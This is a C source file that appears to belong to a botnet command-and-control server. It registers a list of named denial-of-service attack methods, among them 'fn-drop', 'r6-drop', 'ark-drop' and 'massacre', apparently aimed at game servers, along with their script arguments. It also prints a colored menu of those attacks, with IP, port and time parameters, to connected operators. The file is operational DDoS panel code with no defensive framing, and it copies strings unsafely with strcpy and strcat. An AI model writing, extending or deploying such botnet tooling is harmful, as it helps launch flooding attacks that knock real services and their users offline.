#include <arpa/inet.h>
#include <sys/socket.h>

#include "config.h"
#include "attacks.h"
#include "commands.h"

void cnc_add_attack(char *name, char *_atk, int port, int len, char *data, char *extradata)
{
	int i;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(atk[i].type) == 0)
		{
			strcpy(atk[i].name, name);
			strcpy(atk[i].type, _atk);
			strcpy(atk[i].data, data);
			strcpy(atk[i].extradata, extradata);
			atk[i].port = port;
			atk[i].len = len;
			break;
		}
	}
}

void cnc_display_attacks(const int fd)
{
	char _atk[8096];
	int i, len = 0, ii;

	for(i = 0; i < MAX_CONNS; i++)
	{
		if(strlen(atk[i].type) > 0)
		{
			strcpy(_atk, "\e[38;5;79m║ ");
			strcat(_atk, "\e[38;5;230m");
			strcat(_atk, atk[i].name);
			for(ii = 0; ii < 10 - strlen(atk[i].name); ii++)
				strcat(_atk, "\e[38;5;204m.");
			strcat(_atk, "\e[38;5;230m: ");
			send(fd, _atk, strlen(_atk), MSG_NOSIGNAL);

			send(fd, " \e[38;5;79m[\e[38;5;204mIP\e[38;5;79m]", strlen(" \e[38;5;79m[\e[38;5;204mIP\e[38;5;79m]"), MSG_NOSIGNAL);
			if(atk[i].port == 1)
				send(fd, " \e[38;5;79m[\e[38;5;204mPORT\e[38;5;79m]", strlen(" \e[38;5;79m[\e[38;5;204mPORT\e[38;5;79m]"), MSG_NOSIGNAL);
			if(atk[i].len == 1)
				send(fd, " \e[38;5;79m[\e[38;5;204mLEN\e[38;5;79m]", strlen(" \e[38;5;79m[\e[38;5;204mLEN\e[38;5;79m]"), MSG_NOSIGNAL);
			send(fd, " \e[38;5;79m[\e[38;5;204mTIME\e[38;5;79m]", strlen(" \e[38;5;79m[\e[38;5;204mTIME\e[38;5;79m]"), MSG_NOSIGNAL);
			send(fd, "\r\n", strlen("\r\n"), MSG_NOSIGNAL);
		}
	}
}

void cnc_add_attacks(void)
{
	cnc_add_attack("odin", "odin", 1, 0, "odin.txt 4 -1", "");
	cnc_add_attack("gunther", "gunther", 1, 0, "gunther.txt 4 -1", "");
	cnc_add_attack("phoenix", "phoenix", 1, 0, "4 -1", "1");
	cnc_add_attack("kratos", "kratos", 1, 0, "kratos.txt 4 -1", "");
	cnc_add_attack("osiris", "osiris", 1, 0, "osiris.txt 4 -1", "");
	cnc_add_attack("massacre", "massacre", 0, 0, "1 -1", "");
	cnc_add_attack("ethera", "ethera", 0, 0, "", "8");
	cnc_add_attack("home", "home", 1, 0, "", "");
	cnc_add_attack("fn-drop", "fn-drop", 1, 0, "fn-drop.txt", "88");
	cnc_add_attack("r6-drop", "r6-drop", 0, 0, "r6-drop.txt 40", "");
	cnc_add_attack("eris", "eris", 1, 0, "", "8");
	cnc_add_attack("ark-drop", "ark-drop", 1, 0, "8", "");
	cnc_add_attack("oryx", "oryx", 1, 0, "600 4 -1", "");
	cnc_add_attack("witch", "witch", 1, 0, "witch.txt 4 -1", "");
	//cnc_add_attack("ANUBIS", "anubis", 1, 0, "", "");
}
